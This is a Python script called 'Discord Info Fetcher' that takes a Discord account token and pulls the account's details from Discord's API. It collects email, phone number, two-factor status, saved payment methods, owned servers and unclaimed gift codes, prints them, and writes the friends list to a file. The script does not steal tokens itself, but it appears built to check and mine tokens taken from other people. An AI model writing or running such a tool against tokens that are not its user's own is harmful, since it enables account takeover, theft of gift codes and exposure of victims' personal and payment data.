import requests
from datetime import datetime, timezone
from pystyle import Colors, Colorate

def clear():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def print_title(title):
    print(f"{'=' * 60}\n{title}\n{'=' * 60}")

def print_error(message):
    print(f"Error: {message}")

def print_info(message):
    print(f"{message}")

def display_discord_info(token_discord):
    try:
        headers = {'Authorization': token_discord, 'Content-Type': 'application/json'}
        
        user = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
        r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        
        status = "Valid" if r.status_code == 200 else "Invalid"

        username_discord = user.get('username', "None") + '#' + user.get('discriminator', "None")
        display_name_discord = user.get('global_name', "None")
        user_id_discord = user.get('id', "None")
        email_discord = user.get('email', "None")
        email_verified_discord = "Yes" if user.get('verified') else "No"
        phone_discord = user.get('phone', "None")
        mfa_discord = "Yes" if user.get('mfa_enabled') else "No"
        country_discord = user.get('locale', "None")

        created_at_discord = "None"
        if 'id' in user:
            created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc).strftime('%Y-%m-%d %H:%M:%S')

        nitro_discord = {0: 'False', 1: 'Nitro Classic', 2: 'Nitro Boosts', 3: 'Nitro Basic'}.get(user.get('premium_type'), 'None')

        avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user.get('avatar')}.png"
        if requests.get(avatar_url_discord).status_code != 200:
            avatar_url_discord = "None"

        avatar_discord = user.get('avatar', "None")
        avatar_decoration_discord = str(user.get('avatar_decoration_data', "None"))
        public_flags_discord = str(user.get('public_flags', "None"))
        flags_discord = str(user.get('flags', "None"))
        banner_discord = user.get('banner', "None")
        banner_color_discord = user.get('banner_color', "None")
        accent_color_discord = user.get("accent_color", "None")
        nsfw_discord = "Yes" if user.get('nsfw_allowed') else "No"
        linked_users_discord = ' / '.join([str(linked_user) for linked_user in user.get('linked_users', [])]) or "None"
        bio_discord = "\n" + user.get('bio', "None")

        authenticator_types_discord = ' / '.join([str(authenticator_type) for authenticator_type in user.get('authenticator_types', [])]) or "None"

        guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers)
        guild_count = "None"
        owner_guild_count = "None"
        owner_guilds_names = "None"

        if guilds_response.status_code == 200:
            guilds = guilds_response.json()
            guild_count = len(guilds)
            owner_guilds = [guild for guild in guilds if guild['owner']]
            owner_guild_count = f"({len(owner_guilds)})"
            owner_guilds_names = "\n" + "\n".join([f"{guild['name']} ({guild['id']})" for guild in owner_guilds])

        billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
        payment_methods_discord = ' / '.join(['CB' if method['type'] == 1 else 'Paypal' if method['type'] == 2 else 'Other' for method in billing_discord]) or "None"

        friends_response = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
        friends_discord = "None"

        if friends_response.status_code == 200:
            friends = friends_response.json()
            friends_list = [f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})" for friend in friends if friend['type'] not in [64, 128, 256, 1048704]]
            friends_discord = ' / '.join(friends_list) or "None"

            with open('friends_list.txt', 'w', encoding='utf-8') as file:
                for friend in friends_list:
                    file.write(friend + '\n')

        gift_codes_response = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers)
        gift_codes_discord = "None"

        if gift_codes_response.status_code == 200:
            gift_codes = gift_codes_response.json()
            codes = [f"Gift: {gift_code['promotion']['outbound_title']}\nCode: {gift_code['code']}" for gift_code in gift_codes]
            gift_codes_discord = '\n\n'.join(codes) if codes else "None"

        print(f"""
Status : {status}
Token : {token_discord}
Username : {username_discord}
Display Name : {display_name_discord}
Id : {user_id_discord}
Created : {created_at_discord}
Country : {country_discord}
Email : {email_discord}
Verified : {email_verified_discord}
Phone : {phone_discord}
Nitro : {nitro_discord}
Linked Users : {linked_users_discord}
Avatar Decor : {avatar_decoration_discord}
Avatar : {avatar_discord}
Avatar URL : {avatar_url_discord}
Accent Color : {accent_color_discord}
Banner : {banner_discord}
Banner Color : {banner_color_discord}
Flags : {flags_discord}
Public Flags : {public_flags_discord}
NSFW : {nsfw_discord}
Multi-Factor Authentication : {mfa_discord}
Authenticator Type  : {authenticator_types_discord}
Billing : {payment_methods_discord}
Gift Code : {gift_codes_discord}
Guilds : {guild_count}
Owner Guilds : {owner_guild_count} {owner_guilds_names}
Bio : {bio_discord}
        """)

        input(f"Press Enter to return to the main menu...")

    except Exception as e:
        print_error(f"Error when retrieving information: {e}")

if __name__ == "__main__":
    clear()
    try:
        print_title("Discord Info Fetcher")
        token_discord = input(f"Enter Discord token: ")
        display_discord_info(token_discord)
        clear()
    except Exception as e:
        print_error(e)